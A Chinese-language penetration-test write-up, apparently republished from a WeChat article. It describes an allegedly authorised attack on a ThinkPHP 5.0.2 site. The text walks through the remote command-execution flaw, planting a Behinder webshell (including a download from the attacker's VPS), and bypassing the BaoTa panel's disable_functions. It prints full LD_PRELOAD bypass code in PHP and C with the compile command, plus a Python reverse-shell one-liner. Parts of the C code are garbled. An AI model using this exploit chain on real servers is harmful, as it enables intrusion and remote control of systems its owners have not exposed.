\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/xwu7aXaxI6ombHF5XX5WVQ)

一次授权测试中，发现网站是 ThinkPHP 5.0.2 搭建的

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsNXKxuias103bqU2XYJcVGibkK9yjJbyNlKbGbOADjuQkFm8QErrOyDfQ/640?wx_fmt=png)

漏洞存在 ThinkPHP 5.0.2 命令执行

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsZIky0HK7BmcfMs2dH5h3kHCuusybsm3xLw2JJKnkowEgv2Z5jtaaiaQ/640?wx_fmt=png)

尝试写入冰蝎 3.0 的马

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmszKHeYN2fnFiaL47KFtYibV9YAtcPlmIyNfr9JeibIKuhtUVGX8aMdTPyA/640?wx_fmt=png)

写入报错发现是 & 的问题。将 & url 编码。再次尝试

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsc9GfvB9jeEaVyyiaXyS8ed9G2zVBPQlREGIHmWxrh6G7lXarzq0Ufmg/640?wx_fmt=png)

链接失败。

经过本地尝试，发现是 + 的问题，再写入后，将 + 变为了空格。将其 url 编码，再次写入链接发现失败，继续肝。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsNFnjZwIjbMl7YZ0ku9HGUdA7XSP2pRIKTCyic4ofjGlLAxVFiaxpVzcQ/640?wx_fmt=png)

除了写入，还可以使用 PHP 中的 copy 函数，在 vps 上开启服务，将 vps 的马子，直接下载至目标服务器上

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsPomd41XZbDPVv3ed7c52r0FBOtVxX5bo0G6iciazueKK0svmW4icn9AIw/640?wx_fmt=png)

链接成功，接下来肯定是 whoami 一下。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsxlj2fTcgbBBatXja3a3VWpMicU0dhJf5TASoU3m2AQcfNbCib56csaiag/640?wx_fmt=png)

查看 disable\_functions，发现是可爱的宝塔禁用了

passthru,exec,system,chroot,chgrp,chown,shell\_exec,popen,proc\_open,ini\_alter,ini\_restore,dl,openlog,syslog,readlink,symlink,popepassthru

还有啥是宝塔不能禁的。。。还能怎么办，接着肝，在网上学习了大佬的帖子

https://www.meetsec.cn/index.php/archives/44/

尝试利用 LD\_PRELOAD 绕过 disable\_functions

直接上代码

**bypass\_disablefunc.php**

```
<?php
echo "<p> <b>example</b>: http://site.com/bypass\_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass\_disablefunc\_x64.so </p>";


    $cmd = $\_GET\["cmd"\];
    $out\_path = $\_GET\["outpath"\];
    $evil\_cmdline = $cmd . " > " . $out\_path . " 2>&1";
echo "<p> <b>cmdline</b>: " . $evil\_cmdline . "</p>";


    putenv("EVIL\_CMDLINE=" . $evil\_cmdline);


    $so\_path = $\_GET\["sopath"\];
    putenv("LD\_PRELOAD=" . $so\_path);


    mail("", "", "", "");


echo "<p> <b>output</b>: <br />" . nl2br(file\_get\_contents($out\_path)) . "</p>"; 


    unlink($out\_path);
?>
```

**bypass\_disablefunc.c**  

```
#define \_GNU\_SOURCE


#include stdlib.h
#include stdio.h
#include string.h




extern char environ;


\_\_attribute\_\_ ((\_\_constructor\_\_)) void preload (void)
{
get command line options and arg
const char cmdline = getenv(EVIL\_CMDLINE);


     unset environment variable LD\_PRELOAD.
     unsetenv(LD\_PRELOAD) no effect on some 
distribution (e.g., centos), I need crafty trick.
int i;
for (i = 0; environ\[i\]; ++i) {
if (strstr(environ\[i\], LD\_PRELOAD)) {
                    environ\[i\]\[0\] = '0';
            }
    }


executive command
system(cmdline);
}
```

用命令 gcc -shared -fPIC 

bypass\_disablefunc.c -o bypass\_disable

func\_x64.so 将 bypass\_disablefunc.c 编译为共享对象

bypass\_disablefunc\_x64.so：

要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。通过冰蝎上传，然后测试效果：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsNDXLg1o3UK0SQD8XibiaQ3Q2MYriben3Rq21e7PrGDsgic9Xrdd6EK6dHA/640?wx_fmt=png)

命令执行成功。Nc 反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsKwibGLDHGyzqR6ycaQkOosc2ia6BoicnVjqibSo6JIdwl2G2iaS8j2REb5A/640?wx_fmt=png)

提示没有 - e 的参数，直接使用 python 反弹

python -c 'import 

socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQmsBQEAtC9rbwPVoibH3HtLyOKEephiaia3Lll2Z7ADn8aibtfwBqqKiaj3xxg/640?wx_fmt=png)

反弹成功

**总结**：这次的测试，写入冰蝎的过程要注意编码问题。然后就是利用 LD\_PRELOAD 绕过 disable\_functions。

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ09w6Xth5xWIzupiaShFgnQms2XKNvgFv6Oyg3ibhs1GQolo6OiaEZGdpjZtllZqyibkK0lKs1iclgSgSHA/640?wx_fmt=png)